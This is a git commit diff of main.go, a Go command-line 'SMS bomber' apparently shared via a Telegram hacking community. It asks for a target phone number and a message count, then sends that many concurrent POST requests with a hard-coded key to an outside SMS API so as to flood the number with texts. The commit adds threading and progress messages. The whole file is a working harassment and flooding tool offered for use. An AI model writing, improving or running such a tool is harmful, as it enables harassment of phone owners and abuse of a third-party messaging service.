0e696928dca9d44cbb8a798f064fc4ba601dd6c6
Md Nahid Alam <76641588+md-nahid-alam@users.noreply.github.com>
2023-03-11 10:23:13 +0600

    Update main.go

--- main.go
+++ main.go
@@ -4,9 +4,11 @@ import (
     "bytes"
     "encoding/json"
     "fmt"
+    "log"
     "net/http"
     "strconv"
     "sync"
+    "sync/atomic"
 )
 
 func main() {
@@ -14,31 +16,41 @@ func main() {
   _____       ___             __
  / ___/__    / _ )___  __ _  / /  ___ ____
 / (_ / _ \  / _  / _ \/  ' \/ _ \/ -_) __/
-\___/\___/ /____/\___/_/_/_/_.__/\__/_/ [@0xNaHiD]`
+\___/\___/ /____/\___/_/_/_/_.__/\__/_/ \[@0xNaHiD]`
     fmt.Println(logo)
-    fmt.Println("\033[34m---------------------------------------------------")
-    fmt.Println("   \033[36mTelegram : \033[35mhttps://t.me/EHCommunityOfficial")
-    fmt.Println("\033[34m---------------------------------------------------")
+    fmt.Println("\033[34m---------------------------------------------------\033[0m")
+    fmt.Println("   \033[36mTelegram : \033[35mhttps://t.me/EHCommunityOfficial\033[0m")
+    fmt.Println("\033[34m---------------------------------------------------\033[0m")
     var number string
     var count int
-    fmt.Print("  \033[33mEnter your number: ")
+    var threadCount int
+
+    fmt.Print("  \033[33mNumber #> ")
     fmt.Scan(&number)
-    fmt.Print("  \033[33mEnter the number of sms you want to send: ")
+    fmt.Print("  \033[33mNumber of sms you want #> ")
     fmt.Scan(&count)
+    fmt.Print("  \033[33mThread (1-20) #> ")
+    fmt.Scan(&threadCount)
+
     data := map[string]string{
         "number": number,
-        "key": "duduBaba",
+        "key":    "nAhIdGaY",
     }
-
     jsonValue, _ := json.Marshal(data)
 
     var wg sync.WaitGroup
     wg.Add(count)
 
+    var requestsSent int32
+    fmt.Printf("\n  \033[32mStarting to send %d SMS to %s using %d threads...\033[0m\n\n", count, number, threadCount)
+
     for i := 0; i < count; i++ {
         go func(i int) {
             defer wg.Done()
-            req, err := http.NewRequest("POST", "https://api.toxinum.xyz/v2/sms", bytes.NewBuffer(jsonValue))
+            req, err := http.NewRequest("POST", "https://api.toxinum.xyz/v1/sms", bytes.NewBuffer(jsonValue))
+            if err != nil {
+                log.Fatal(err)
+            }
             req.Header.Set("Content-Type", "application/json")
 
             client := &http.Client{}
@@ -48,9 +60,19 @@ func main() {
             }
 
             defer resp.Body.Close()
-            fmt.Println("")
-            fmt.Println(" \033[37m Sending", strconv.Itoa(i+1), "Sms To", number)
+
+            // Increment the requestsSent counter atomically
+            sent := strconv.Itoa(i + 1)
+            fmt.Printf("  \033[36mSending %s SMS to %s\033[0m\n", sent, number)
+            if sentCount := incrementRequestsSent(&requestsSent); sentCount == count {
+                fmt.Printf("\n  \033[32mAll %d SMS sent to %s successfully!\033[0m\n", count, number)
+            }
         }(i)
     }
+
     wg.Wait()
+}
+
+func incrementRequestsSent(count *int32) int {
+    return int(atomic.AddInt32(count, 1))
 }
